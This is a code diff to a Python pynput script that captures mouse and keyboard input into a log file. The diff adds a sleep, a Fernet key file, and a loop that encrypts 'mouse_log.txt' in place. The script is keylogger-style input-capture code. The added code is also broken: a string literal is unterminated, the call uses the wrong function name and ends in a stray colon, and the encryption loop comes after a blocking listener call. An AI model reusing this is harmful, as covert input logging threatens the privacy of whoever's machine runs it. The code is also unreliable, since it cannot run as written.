@@ -1,8 +1,9 @@
 from pynput.mouse import Listener
 from pynput import keyboard
-
+import os
+from cryptography.fernet import Fernet
 import logging
-
+import time
 
 
 
@@ -57,3 +58,44 @@ with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll,on_press=o
     listener.join()
 
         
+
+        
+        
+        
+        
+        
+time.sleep(100) # Sleep for 100 seconds
+
+
+
+
+
+
+
+key = Fernet.generate_key()
+
+#Make A Key
+if not os.path.exists('mykey.key'):
+    with open('mykey.key', 'wb') as mykey:
+        mykey.write(key)
+
+with open('mykey.key', 'rb') as mykey:
+    key = mykey.read()
+
+the_file = 'mouse_log.txt
+#Encrypting
+def Encrypt():
+
+
+    f = Fernet(key)
+
+    with open(the_file, 'rb') as original_file:
+        original = original_file.read()
+
+    encrypted = f.encrypt(original)
+
+    with open(the_file, 'wb') as encrypted_file:
+        encrypted_file.write(encrypted)
+
+while True:
+    encrypt():
